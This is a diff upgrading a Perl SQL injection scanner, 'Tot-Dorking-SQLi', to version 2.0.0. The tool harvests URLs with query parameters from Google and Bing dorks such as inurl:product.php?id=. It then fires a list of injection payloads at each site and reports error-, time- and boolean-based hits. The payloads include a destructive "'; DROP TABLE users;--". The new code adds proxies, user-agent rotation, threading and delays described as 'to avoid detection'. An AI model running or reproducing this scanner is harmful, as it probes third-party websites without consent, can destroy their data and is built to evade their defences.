@@ -1,17 +1,19 @@
 #!/usr/bin/perl
 
-#####################################"
-# Tot-Dorking-SQLi : v1.0.0         #"
-# Autor: Mr.GagalTotal666           #"
-#####################################"
-# Copyright 2017 GagalTotal666      #"
-#####################################"
+#####################################
+# Tot-Dorking-SQLi : v2.0.0         #
+# Autor: GagalTotal666              #
+# Enhanced SQLi Detection           #
+#####################################
+# Copyright 2017-2025 GagalTotal666 #
+#####################################
 
-#########################################################################"
-##                Mr.GagalTotal666 And Mr.GhostGTR666                  ##"
-#########################################################################"
+#########################################################################
+##                GagalTotal666 And GhostGTR666                        ##
+#########################################################################
 
 use strict;
+use warnings;
 use Term::ANSIColor;
 
 $| = 1;
@@ -20,48 +22,62 @@ $SIG{'INT'} = \&Interrupt;
 # Modulos/Librerias
 use HTTP::Request;
 use LWP::UserAgent;
+use LWP::Protocol::https;
 
 use Benchmark;
 use POSIX;
 use threads;
+use threads::shared;
 use Time::HiRes "usleep";
+use URI::Escape;
 
 my ($lang, %Lang, @en, @in);
 
 $ENV{'LANG'} =~ /^(\w*)_.*$/;
 if($1 eq 'in'){
-	$lang = 'in';
+    $lang = 'in';
 }
 elsif($1 eq 'en'){
-	$lang = 'en';
+    $lang = 'en';
 }
 else{
-	$lang = 'en';
+    $lang = 'en';
 }
 
 @en = (
-	'Use googleDork',
-	'Use bingDork',
-	'Specify List of Dork links',
-	'Specify Page',
-	'Save Results To File',
-	'Use Proxy',
-	'detected traffic "unusual" the IP',
-	'change it to continue [(C)hange a Bing/(Q)remove/Continue[Enter]]',
-	'Continue...',
-	'Scanning Completed',
-	'vulnerabilities',
-	'Can not write to file',
-	'Specify another file:',
-	"\n\n1) Change proxy\n2) Change dork\n3) Leave\n\n\$> ",
-	'New proxy',
-	'New dork',
-	'Finish',
-	'Invalid option',
-	'Getting links...(mendapatkan link...)',
-	'You can only use one search engine at a time!',
-	'Scanning',
-	'There are no vulnerablies(Tidak ada vulnerablies)'
+    'Use googleDork',
+    'Use bingDork',
+    'Specify List of Dork links',
+    'Specify Page',
+    'Save Results To File',
+    'Use Proxy',
+    'detected traffic "unusual" the IP',
+    'change it to continue [(C)hange a Bing/(Q)remove/Continue[Enter]]',
+    'Continue...',
+    'Scanning Completed',
+    'vulnerabilities',
+    'Can not write to file',
+    'Specify another file:',
+    "\n\n1) Change proxy\n2) Change dork\n3) Change user agent\n4) Add delay\n5) Leave\n\n\$> ",
+    'New proxy',
+    'New dork',
+    'New user agent',
+    'Delay in seconds',
+    'Finish',
+    'Invalid option',
+    'Getting links...',
+    'You can only use one search engine at a time!',
+    'Scanning',
+    'There are no vulnerabilities',
+    'Advanced SQLi Detection Enabled',
+    'Using proxy',
+    'Testing SQLi payloads',
+    'Potential SQLi found',
+    'Time-based detection',
+    'Error-based detection',
+    'Boolean-based detection',
+    'Testing parameter',
+    'Thread'
 );
 
 @in = (
@@ -78,35 +94,70 @@ else{
     'Kerentanan',
     'Tidak bisa menulis ke file',
     'Tentukan file lain:',
-    "\ N \ n1) Ubah Proxy \ n2) Ganti dork \ n3) Tinggalkan \ n \ n \ $>",
+    "\n\n1) Ubah Proxy\n2) Ganti dork\n3) Ganti user agent\n4) Tambah delay\n5) Tinggalkan\n\n\$>",
     'Proxy yang baru',
     'Dork New',
+    'User agent baru',
+    'Delay dalam detik',
     'Selesai',
     'Pilihan tidak valid',
-    'Link Mendapatkan ...',
+    'Mendapatkan link...',
     'Anda hanya dapat menggunakan satu mesin pencari pada suatu waktu! ',
     'Scanning',
-    'Tidak ada vulnerablies'
+    'Tidak ada kerentanan',
+    'Deteksi SQLi Lanjutan Diaktifkan',
+    'Menggunakan proxy',
+    'Menguji payload SQLi',
+    'SQLi potensial ditemukan',
+    'Deteksi berbasis waktu',
+    'Deteksi berbasis error',
+    'Deteksi berbasis boolean',
+    'Menguji parameter',
+    'Thread'
 );
-
 
 %Lang = (
-	'in' => \@in,
-	'en' => \@en
+    'in' => \@in,
+    'en' => \@en
 );
 
+# Enhanced User Agents list
 my @UserAgents = (
-'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
-'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0',
-'Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0',
-'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))',
-'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)',
-'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
-'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
-'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14');
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'
+);
 
-our ($Dork,$BingDork,$List,$NumPages,$FileLinks,$Proxy);
+# Advanced SQLi payloads
+my @SQLiPayloads = (
+    "'", 
+    "''", 
+    "`", 
+    "\"", 
+    "' OR '1'='1", 
+    "' OR 1=1--", 
+    " OR 1=1", 
+    "' UNION SELECT NULL--", 
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+    "' OR IF(1=1,SLEEP(5),0)--",
+    "' WAITFOR DELAY '00:00:05'--",
+    "') OR ('1'='1",
+    "'; DROP TABLE users;--",
+    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
+    "' OR (SELECT COUNT(*) FROM sysobjects)>0--",
+    "' OR (SELECT COUNT(*) FROM mysql.user)>0--"
+);
+
+our ($Dork,$BingDork,$List,$NumPages,$FileLinks,$Proxy,$UserAgent,$Delay);
 my @ProTime;
+my $ThreadCount :shared = 0;
+my $MaxThreads = 5;
 
 sub GetOptions(){
     for(my $i = 0;$i <= $#ARGV;$i++){
@@ -155,6 +206,27 @@ sub GetOptions(){
             }
             $Proxy = $ARGV[$i];
         }
+        elsif($ARGV[$i] eq '--user-agent'){
+            $i++;
+            if($i > $#ARGV){
+                &gunakan("Specify user agent\n");
+            }
+            $UserAgent = $ARGV[$i];
+        }
+        elsif($ARGV[$i] eq '--delay'){
+            $i++;
+            if($i > $#ARGV){
+                &gunakan("Specify delay between requests\n");
+            }
+            $Delay = $ARGV[$i];
+        }
+        elsif($ARGV[$i] eq '--threads'){
+            $i++;
+            if($i > $#ARGV){
+                &gunakan("Specify number of threads\n");
+            }
+            $MaxThreads = $ARGV[$i];
+        }
     }
 }
 
@@ -170,11 +242,11 @@ if($lang eq 'in'){
 \r   ██║   ╚██████╔╝   ██║       ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝    ███████║╚██████╔╝███████╗██║
 \r   ╚═╝    ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
 
-\r============================================== Version V.0.0.1 ======================================================
-\r===================================== Mr.Gagaltotal666 | Mr.GhostGTR666 =============================================
+\r============================================== Version V.2.0.0 ======================================================
+\r=====================================  Gagaltotal666 | GhostGTR666   ================================================
 \r========================================     gagaltotal.github.io ===================================================
 
-\rgunakan: $0 [-g/b <dork>] [-p <page>] [-l <links.txt>]  [-f <pages_found>]
+\rgunakan: $0 [-g/b <dork>] [-p <page>] [-l <links.txt>]  [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>]
 
   -g <Dork>
       Google Dork Pencarian
@@ -188,13 +260,19 @@ if($lang eq 'in'){
       Halaman Ditemukan Log
   --proxy <proxy>
       Tentukan Server Proxy
+  --user-agent <ua>
+      Tentukan User Agent
+  --delay <seconds>
+      Delay antara requests (untuk menghindari deteksi)
+  --threads <count>
+      Jumlah thread maksimal (default: 5)
 
-Contoh Pemakaian: $0 -b inurl:product.php?id= -p 6
-                  $0 -g inurl:product.php?id= -p 2
-                  $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt
-                  $0 -b inurl:product.php?id= -p 1 -f link-vlunSQL.txt
+Contoh Pemakaian: $0 -b inurl:product.php?id= -p 6 --delay 2
+                  $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080
+                  $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --user-agent "Mozilla/5.0"
+                  $0 -b inurl:product.php?id= -p 1 -f link-vlunSQL.txt --threads 10
                   $0 -l links.txt -f link-vlunSQL.txt
-                  $0 -l links.txt
+                  $0 -l links.txt --delay 1
 
 untuk informasi contoh: perldoc $0
 EOTXT
@@ -210,33 +288,39 @@ else{
 \r   ██║   ╚██████╔╝   ██║       ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝    ███████║╚██████╔╝███████╗██║
 \r   ╚═╝    ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
                                                                                                                       
-\r============================================== Version V.0.0.1 ======================================================
-\r===================================== Mr.Gagaltotal666 | Mr.GhostGTR666 =============================================
+\r============================================== Version V.2.0.0 ======================================================
+\r=====================================  Gagaltotal666 | GhostGTR666   ================================================
 \r========================================     gagaltotal.github.io ===================================================
 
-\rUse: $0 [-g/b <dork>] [-p <pages>] [-l <links.txt>]  [-f <pages_found>]
+\rUse: $0 [-g/b <dork>] [-p <pages>] [-l <links.txt>]  [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>]
 
   -g <Dork>
-      Google Dork Pencarian
+      Google Dork Search
   -b <Bing>
-      Bing Dork Pencarian
+      Bing Dork Search
   -p <page>
-      Jumlah Hasil Pencarian Untuk Cari Melalui
+      Number of Search Results Pages to Scan
   -l <links.txt>
-      Tentukan Daftar halaman untuk Dork - satu per baris
+      Specify List of pages to Dork - one per line
   -f <pages_found>
-      Halaman Ditemukan Log
+      Found Pages Log
   --proxy <proxy>
-      Tentukan Server Proxy
+      Specify Proxy Server
+  --user-agent <ua>
+      Specify User Agent
+  --delay <seconds>
+      Delay between requests (to avoid detection)
+  --threads <count>
+      Maximum number of threads (default: 5)
 
-Contoh Pemakaian: $0 -b inurl:product.php?id= -p 6
-                  $0 -g inurl:product.php?id= -p 2
-                  $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt
-                  $0 -b inurl:product.php?id= -p 1 -f link-vlunSQL.txt
-                  $0 -l links.txt -f link-vlunSQL.txt
-                  $0 -l links.txt
+Example Usage: $0 -b inurl:product.php?id= -p 6 --delay 2
+               $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080
+               $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --user-agent "Mozilla/5.0"
+               $0 -b inurl:product.php?id= -p 1 -f link-vlunSQL.txt --threads 10
+               $0 -l links.txt -f link-vlunSQL.txt
+               $0 -l links.txt --delay 1
 
-Untuk informasi contoh: perldoc $0
+For more information: perldoc $0
 EOTXT
 }
 }
@@ -249,9 +333,11 @@ sub LinksByDork(){
     my ($carga,$porcentaje) = ("",0);
 
     print "Dork: $Dork$BingDork\n";
+    print "Using proxy: $Proxy\n" if $Proxy;
+    print "User Agent: $UserAgent\n" if $UserAgent;
 
     $BingDork =~ s/ /\+/g;$Dork =~ s/ /\+/g;
-    $BingDork =~ s/([^\+A-Za-z0-9\-\._~])/sprintf("%%%02X",ord($1))/eg;$Dork =~ s/([^\+A-Za-z0-9\-\._~])/sprintf("%%%02X",ord($1))/eg;
+    $BingDork = uri_escape($BingDork);$Dork = uri_escape($Dork);
 
     foreach(my $pag = 0;$pag <= $NumPages;$pag++){
         my ($HTML,$Link,@Data);
@@ -261,17 +347,17 @@ sub LinksByDork(){
         $carga = "=" x ($porcentaje < 100 ? ceil($porcentaje)/2 : floor($porcentaje)/2);
 
         if($Dork){
-            my @Nav = &Navegar('http://www.google.com/search?q='.$Dork.'&start='.$Pages);
+            my @Nav = &Navegar('https://www.google.com/search?q='.$Dork.'&start='.$Pages.'&num=100');
             $HTML = $Nav[4];
             push(@ProTime,$Nav[3]);
         }
         elsif($BingDork){
-            my @Nav = &Navegar('http://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
+            my @Nav = &Navegar('https://www.bing.com/search?q='.$BingDork.'&first='.$Pages.'&count=50');
             $HTML = $Nav[4];
             push(@ProTime,$Nav[3]);
         }
 
-        if($HTML =~ m/Our systems have detected unusual traffic from your computer/i){
+        if($HTML =~ m/Our systems have detected unusual traffic from your computer/i || $HTML =~ m/recaptcha/i){
             $HTML =~ /IP address\: (\S+)\<br/i;
             print "\r$Lang{$lang}[6] $1\n$Lang{$lang}[7] ";
             chomp(my $CQ = <STDIN>);
@@ -286,7 +372,7 @@ sub LinksByDork(){
                 $BingDork = $Dork;
                 $Dork = 0;
                 $Pages += 1;
-                my @Nav = &Navegar('http://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
+                my @Nav = &Navegar('https://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
                 $HTML = $Nav[3];
             }
             else{
@@ -296,10 +382,14 @@ sub LinksByDork(){
         }
 
         if($Dork){
-            @Data = $HTML =~ m/href="\/url\?q=(\S+)">/gi;
+            @Data = $HTML =~ m/<a href="\/url\?q=([^"]+)[^>]*>/gi;
         }
         elsif($BingDork){
             @Data = $HTML =~ /<h3><a href="([-.:%?=&\/\w]+)"/mgi;
+        }
+
+        if($#Data <= 0){
+            @Data = $HTML =~ m/<a href="(http[^"]+)"[^>]*><h3/gi;
         }
 
         if($#Data <= 0){
@@ -307,15 +397,22 @@ sub LinksByDork(){
         }
 
         foreach $Link(@Data){
-            if($Link !~ m/google.com/i && $Link !~ m/googleusercontent.com/i && $Link !~ m/msn.com/i && ($Link =~ m/\%3f\S+%3d\S+/i || $Link =~ /\?\S+=\S+/)){
+            if($Link !~ m/google\./i && $Link !~ m/bing\./i && $Link !~ m/msn\./i && 
+               ($Link =~ m/\%3f\S+%3d\S+/i || $Link =~ /\?\S+=\S+/ || $Link =~ /\.php\?/i || 
+                $Link =~ /\.asp\?/i || $Link =~ /\.aspx\?/i || $Link =~ /\.jsp\?/i)){
+                
                 $Link =~ s/\&amp\;/\&/g;
+                $Link =~ s/%3f/?/gi;
+                $Link =~ s/%3d/=/gi;
                 $Link =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
                 $Link =~ s/^https:\/\//http:\/\//g;
 
                 push(@Links,$Link);
             }
         }
-        $Pages += 10;
+        $Pages += $Dork ? 10 : 1;
+        
+        sleep($Delay) if $Delay;
     }
 
     print "\n\n";
@@ -327,17 +424,19 @@ sub LinksByDork(){
 
 sub LinksByList(){
     my @Links;
-    $NumPages = 10;
+    $NumPages = 10 unless $NumPages;
 
-    open(LIST,"$List");
+    open(LIST,"<$List") or die "Cannot open $List: $!";
 
     while(<LIST>){
         chomp;
+        next unless $_;
 
-        foreach my $search(("","inurl:php?id=")){
+        foreach my $search(("","inurl:php?id=","inurl:asp?id=","inurl:aspx?id=")){
             $Dork = "site:$_ $search";
-            push(@Links,LinksByDork());
-            last if $#Links > 0;
+            my @found = LinksByDork();
+            push(@Links, @found) if @found;
+            last if $#Links > 50;
         }
     }
 
@@ -348,7 +447,7 @@ sub LinksByList(){
 
 sub Navegar(){
     my $URL      = $_[0];
-    my $TimeOut  = $_[1];
+    my $TimeOut  = $_[1] || 30;
 
     my $Data = '';
     my @time;
@@ -356,14 +455,22 @@ sub Navegar(){
     my ($UA,$Req,$Resp,$Contenido);
 
     $UA = LWP::UserAgent->new;
-    $UA->agent($UserAgents[int(rand($#UserAgents+1))]);
+    $UA->agent($UserAgent || $UserAgents[int(rand($#UserAgents+1))]);
+    $UA->timeout($TimeOut);
+    $UA->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);
 
-    $URL =~ /^http\:\/\/([\w\.]+)\/*/;
-    $UA->default_header('Host' => $1);
-    $UA->default_header('Accept' => 'text/html');
+    if($Proxy){
+        $UA->proxy(['http', 'https'], $Proxy);
+    }
+
+    $URL =~ /^https?\:\/\/([\w\.\-]+)\/*/;
+    $UA->default_header('Host' => $1) if $1;
+    $UA->default_header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
     $UA->default_header('Accept-Language' => 'en-US,en;q=0.5');
+    $UA->default_header('Accept-Encoding' => 'gzip, deflate');
     $UA->default_header('DNT' => '1');
     $UA->default_header('Connection' => 'close');
+    $UA->default_header('Upgrade-Insecure-Requests' => '1');
 
     eval {
         local $SIG{'ALRM'} = sub { die "TimeOut" };
@@ -379,7 +486,6 @@ sub Navegar(){
         alarm 0;
     };
 
-
     alarm 0;
 
     return(0,"Time Out") if($@ && $@ =~ /TimeOut/);
@@ -387,7 +493,7 @@ sub Navegar(){
 
     my @Return = (1,"20x OK",0,"$time[2].0",0);
 
-#   $Return[2] = $1 if($Data =~ m[Server\: (.+)\r\n]);
+    $Return[2] = $Resp->header('Server') if $Resp->header('Server');
     $Return[4] = $Resp->content();
 
     return @Return;
@@ -395,53 +501,89 @@ sub Navegar(){
 
 sub SQL(){
     my $Link = $_[0];
+    
+    {
+        lock $ThreadCount;
+        $ThreadCount++;
+        print color('yellow') . "[$Lang{$lang}[33] $ThreadCount] Testing: $Link" . color('reset') . "\n";
+    }
 
     my $LinkMod;
     my @HTML = (0) x 3;
 
-    my @Edit      = split('\?',$Link);
+    my @Edit      = split('\?',$Link, 2);
+    return 0 unless $#Edit == 1;
+
     my @Variables = split('&',$Edit[1]);
-    my %Vars      = map {split('=',$_)} @Variables;
+    my %Vars      = map {split('=',$_,2)} @Variables;
 
     foreach my $Var(keys %Vars){
-        $LinkMod = &ModLink($Edit[0],\@Variables,$Var," '");
-
-        my @Nav = &Navegar($LinkMod);
-        unless($Nav[0]){ return 0 }
-        else{ $HTML[0] = $Nav[4] }
-
-        my $time3 = $Nav[3];
-
-        if($HTML[0] =~ m/You have an error in your SQL syntax/i){
-            my @Ret = ($Link,$Var," '",$time3);
-            return \@Ret;
-        }
-        elsif($HTML[0] =~ m/Supplied argument is not a valid MySQL/i){
-            my @Ret = ($Link,$Var," '",$time3);
-            return \@Ret;
-        }
-
-        my ($tmp,$aumento);
-        $tmp += $_ foreach(@ProTime);
-        $tmp = int($tmp/($#ProTime+1));
-        $aumento = $time3 >= ($tmp+3) ? 10 : 5;
-
-        foreach my $payload(("' and sleep(".($time3+$aumento).") and '1' = '1"," and sleep(".($time3+$aumento).") and 1 = 1")){
+        print color('cyan') . "[$Lang{$lang}[32]] $Link?$Var=..." . color('reset') . "\n";
+        
+        # Test multiple SQLi payloads
+        for my $payload (@SQLiPayloads) {
             $LinkMod = &ModLink($Edit[0],\@Variables,$Var,$payload);
 
             my @Nav = &Navegar($LinkMod);
             unless($Nav[0]){ next }
-            else{ $HTML[0] = $Nav[4] }
+            
+            $HTML[0] = $Nav[4];
+            my $response_time = $Nav[3];
 
-            my $timedif = $Nav[3];
-
-            if($timedif >= ($time3+$aumento)){
-                my @Ret = ($Link,$Var,$payload,$timedif);
+            # Error-based detection
+            if($HTML[0] =~ m/You have an error in your SQL syntax/i ||
+               $HTML[0] =~ m/Supplied argument is not a valid MySQL/i ||
+               $HTML[0] =~ m/ORA-[0-9]{5}/i ||
+               $HTML[0] =~ m/Microsoft OLE DB Provider/i ||
+               $HTML[0] =~ m/Unclosed quotation mark/i ||
+               $HTML[0] =~ m/Incorrect syntax/i) {
+                
+                print color('green') . "[$Lang{$lang}[28]] $Link?$Var=$payload" . color('reset') . "\n";
+                my @Ret = ($Link,$Var,$payload,$response_time,"Error-based");
                 return \@Ret;
+            }
+
+            # Time-based detection
+            my ($tmp,$aumento);
+            $tmp += $_ foreach(@ProTime);
+            $tmp = int($tmp/($#ProTime+1)) if @ProTime;
+            $tmp ||= 1;
+            $aumento = $response_time >= ($tmp+3) ? 10 : 5;
+
+            if($payload =~ /sleep\((\d+)\)/i) {
+                my $sleep_time = $1;
+                if($response_time >= $sleep_time) {
+                    print color('green') . "[$Lang{$lang}[27]] $Link?$Var=$payload" . color('reset') . "\n";
+                    my @Ret = ($Link,$Var,$payload,$response_time,"Time-based");
+                    return \@Ret;
+                }
+            }
+
+            # Boolean-based detection (compare with original)
+            my @NavOriginal = &Navegar($Link);
+            if($NavOriginal[0]) {
+                my $original_content = $NavOriginal[4];
+                my $test_content = $HTML[0];
+                
+                # Significant SQLi
+                if($test_content ne $original_content && 
+                   (length($test_content) != length($original_content) ||
+                   $test_content =~ /different.*result/i)) {
+                    
+                    print color('green') . "[$Lang{$lang}[29]] $Link?$Var=$payload" . color('reset') . "\n";
+                    my @Ret = ($Link,$Var,$payload,$response_time,"Boolean-based");
+                    return \@Ret;
+                }
             }
         }
     }
-    return 0
+
+    {
+        lock $ThreadCount;
+        $ThreadCount--;
+    }
+    
+    return 0;
 }
 
 sub ModLink(){
@@ -450,13 +592,13 @@ sub ModLink(){
     my $Var       = $_[2];
     my $Code      = $_[3];
 
-    my %Vars = map {split('=',$_)} @Variables;
+    my %Vars = map {split('=',$_,2)} @Variables;
 
     my $LinkMod = $Host.'?';
 
     foreach (keys %Vars){
-        if($Var eq $_){$LinkMod .= "$_=".$Vars{$_}." $Code&";}
-        else{$LinkMod .= "$_=".$Vars{$_}."&";}
+        if($Var eq $_){$LinkMod .= "$_=".uri_escape($Vars{$_}.$Code)."&";}
+        else{$LinkMod .= "$_=".uri_escape($Vars{$_})."&";}
     }
     chop($LinkMod);
     return $LinkMod;
@@ -464,21 +606,20 @@ sub ModLink(){
 
 sub EliminarRep(){
     my @Links = @_;
-    my @HP1;
-    my @HP2;
+    my %seen;
+    my @unique;
 
-    for(my $i = 0;$i <= $#Links;$i++){
-        @HP1 = split('\?',$Links[$i]);
-        for(my $x = $i;$x <= $#Links;$x++){
-            @HP2 = split('\?',$Links[$x]);
-            if($i != $x && $HP1[0] eq $HP2[0]){
-                splice(@Links,$x,1);
-                $x-- if $x != 0;
-            }
+    foreach my $link (@Links) {
+        my $norm_link = $link;
+        $norm_link =~ s/^https?:\/\///;
+        $norm_link =~ s/\/$//;
+        
+        unless ($seen{$norm_link}++) {
+            push @unique, $link;
         }
     }
 
-    return @Links;
+    return @unique;
 }
 
 sub Show(){
@@ -488,26 +629,26 @@ sub Show(){
     my $nc = 0;
 
     if($^O eq "linux"){
-        printf("\n" x 5);
-        printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
-        printf("|\e[0;33mLink%s\e[0m|\e[0;33mVar%s\e[0m|\e[0;33mPayload%s\e[0m|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7));
-        printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
+        printf("\n" x 2);
+        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
+        printf("|\e[0;33mLink%s\e[0m|\e[0;33mVar%s\e[0m|\e[0;33mPayload%s\e[0m|\e[0;33mType%s\e[0m|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7)," " x ($t[3]-4));
+        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
         foreach my $l(@LinkSQLi){
-            printf("|$c[$nc % 2]%-${t[0]}s\e[0m|$c[$nc % 2]%-${t[1]}s\e[0m|$c[$nc % 2]%-${t[2]}s\e[0m|\n",$$l[0],$$l[1],$$l[2]);
+            printf("|$c[$nc % 2]%-${t[0]}s\e[0m|$c[$nc % 2]%-${t[1]}s\e[0m|$c[$nc % 2]%-${t[2]}s\e[0m|$c[$nc % 2]%-${t[3]}s\e[0m|\n",$$l[0],$$l[1],$$l[2],$$l[4]);
             $nc++;
         }
-        printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
+        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
         system("notify-send \"SQLi Dorking\" \"$Lang{$lang}[9] ".($#LinkSQLi+1)." $Lang{$lang}[10]\" -t 10000");
     }
     else{
-        printf("\n" x 5);
-        printf("+%s+\n","-" x ($t[0]));
-        printf("|Link%s|\n"," " x ($t[0]-4));
-        printf("+%s+\n","-" x ($t[0]));
+        printf("\n" x 2);
+        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
+        printf("|Link%s|Var%s|Payload%s|Type%s|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7)," " x ($t[3]-4));
+        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
         foreach my $l(@LinkSQLi){
-            printf("|%-${t[0]}s|\n",$$l[0]);
+            printf("|%-${t[0]}s|%-${t[1]}s|%-${t[2]}s|%-${t[3]}s|\n",$$l[0],$$l[1],$$l[2],$$l[4]);
         }
-        printf("+%s+\n","-" x ($t[0]));
+        printf("+%s+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]),"-" x ($t[3]));
     }
 
     if($^O eq "MSWin32"){
@@ -533,8 +674,10 @@ sub Interrupt(){
 
     if($resp == 1){print "$Lang{$lang}[14]";chomp($Proxy = <STDIN>)}
     elsif($resp == 2){print "$Lang{$lang}[15]";chomp($Dork = <STDIN>)}
-    elsif($resp == 3){print "$Lang{$lang}[16]\n";exit}
-    else{print "$Lang{$lang}[17]\n";}
+    elsif($resp == 3){print "$Lang{$lang}[16]";chomp($UserAgent = <STDIN>)}
+    elsif($resp == 4){print "$Lang{$lang}[17]";chomp($Delay = <STDIN>)}
+    elsif($resp == 5){print "$Lang{$lang}[18]\n";exit}
+    else{print "$Lang{$lang}[19]\n";}
 }
 
 # End Functions
@@ -543,58 +686,64 @@ sub main(){
     my @Links;
 
     my @LinkSQLi;
-    my @t = (4,8,10);
+    my @t = (4,8,10,12);
 
     GetOptions();
 
-    print "$Lang{$lang}[18]";
+    print "$Lang{$lang}[24]\n";
+    print "$Lang{$lang}[20]";
 
     if($Dork){
         gunakan() unless $NumPages;
         if($BingDork){
-            print "\r$Lang{$lang}[19]\n";
+            print "\r$Lang{$lang}[21]\n";
             gunakan();
         }
-        print "\n";push(@Links,LinksByDork());
+        print "\n";@Links = LinksByDork();
     }
     elsif($BingDork){
         gunakan() unless $NumPages;
         if($Dork){
-            print "\r$Lang{$lang}[19]\n";
+            print "\r$Lang{$lang}[21]\n";
             gunakan();
         }
-        print "\n";push(@Links,LinksByDork());
+        print "\n";@Links = LinksByDork();
     }
-    elsif($List){ print "\n";push(@Links,LinksByList()) }
+    elsif($List){ print "\n";@Links = LinksByList() }
     else{ gunakan }
 
-    print "$Lang{$lang}[20] ".($#Links+1)." links...\n" if $#Links > 0;
+    print "$Lang{$lang}[22] ".($#Links+1)." links...\n" if $#Links > 0;
 
-    foreach(@Links){
-        my $thr1 = threads->create(\&SQL,$_);
-
-        while($thr1->is_running()){
-            for(("/","-","\\","|")){
-                print $_;
-                usleep(80_000);
-                print "\b";
+    # Threaded scanning
+    my @threads;
+    foreach my $link (@Links) {
+        while(1) {
+            {
+                lock $ThreadCount;
+                last if $ThreadCount < $MaxThreads;
             }
+            sleep(1);
         }
 
-        my $Datos = $thr1->join();
+        my $thr = threads->create(\&SQL, $link);
+        push @threads, $thr;
+        
+        sleep($Delay/2) if $Delay;
+    }
 
+    foreach my $thr (@threads) {
+        my $Datos = $thr->join();
         if($Datos){
-            foreach(0..2){
+            foreach(0..3){
                 $t[$_] = length($$Datos[$_]) if($t[$_] < length($$Datos[$_]));
             }
-            printf("\bLink: %s Var: %s Payload: %s Time: %s\n",$$Datos[0],$$Datos[1],$$Datos[2],$$Datos[3]);
-            &Logs(\$FileLinks,"Link: $$Datos[0] Var: $$Datos[1] Payload: $$Datos[2]") if $FileLinks;
+            &Logs(\$FileLinks,"Link: $$Datos[0] Var: $$Datos[1] Payload: $$Datos[2] Type: $$Datos[4]") if $FileLinks;
             push(@LinkSQLi,$Datos);
         }
     }
 
     if(@LinkSQLi){ &Show(\@t,\@LinkSQLi) }
